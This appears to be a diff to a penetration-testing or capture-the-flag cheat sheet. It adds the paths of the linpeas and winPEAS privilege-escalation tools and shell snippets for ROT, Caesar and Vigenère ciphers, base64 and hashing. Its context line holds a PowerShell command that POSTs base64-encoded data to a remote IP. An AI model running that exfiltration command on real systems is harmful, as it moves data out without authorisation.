@@ -346,5 +346,95 @@ Invoke-WebRequest -Uri http://$IP -Method POST -Body $b64
 
 ## privEscTools
 
-linpeas
-winpeas
+```bash
+locate linpeas
+/usr/share/peass/linpeas/linpeas.sh
+
+locate winpeas
+/usr/share/peass/winpeas/winPEASany.exe
+/usr/share/peass/winpeas/winPEASx64.exe
+/usr/share/peass/winpeas/winPEASx86.exe
+```
+
+## Cryptography
+
+### Encryption
+
+> `alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m'"`
+
+```bash
+# ROT13
+echo '<plaintext>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+echo '<ciphertext>' | tr 'N-ZA-Mn-za-m' 'A-Za-z'
+```
+```bash
+# ROT13.5 (ROT18) > ROT13 (for letters) and ROT5 (for numbers)
+echo '<plaintext>' | tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'
+echo '<ciphertext>' | tr 'N-ZA-Mn-za-m5-90-4' 'A-Za-z0-9'
+```
+```bash
+# ROT47
+echo '<plaintext>' | tr '\!-~' 'P-~\!-O'
+echo '<ciphertext>' | tr 'P-~\!-O' '\!-~'
+```
+```bash
+# ROT script
+#!/usr/bin/bash
+    
+dual=abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
+phrase='<plaitext>'
+rotat=13
+newphrase=$(echo $phrase | tr "${dual:0:26}" "${dual:${rotat}:26}")
+echo ${newphrase}
+```
+```bash
+# Caeser cipher
+echo '<plaintext>' | tr '[a-zA-Z]' '[x-za-wX-ZA-W]'
+echo '<ciphertext>' | tr '[x-za-wX-ZA-W]' '[a-zA-Z]'
+```
+```bash
+# vigenere
+/opt/cryptography/vigenere.sh
+/opt/cryptography/vigenere.sh -d
+```
+```bash
+# Vigenere script
+#!/usr/local/bin/bash
+
+a="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+[[ "${*/-d/}" != "" ]] &&
+echo "Usage: $0 [-d]" && exit 1
+m=${1:+-}
+
+printf "string: ";read t
+printf "keyphrase: ";read -s k
+printf "\n"
+for ((i=0;i<${#t};i++)); do
+  p1=${a%%${t:$i:1}*}
+  p2=${a%%${k:$((i%${#k})):1}*}
+  d="${d}${a:$(((${#p1}${m:-+}${#p2})%${#a})):1}"
+done
+echo "$d"
+```
+
+### Encoding
+
+```bash
+base64 $text
+base64 -d $text
+```
+
+### Hashing
+
+```bash
+openssl md5 $text
+openssl sha1 $text
+openssl sha256 $text
+```
+
+```bash
+md5sum $text
+sha1sum $text
+sha256sum $text
+```
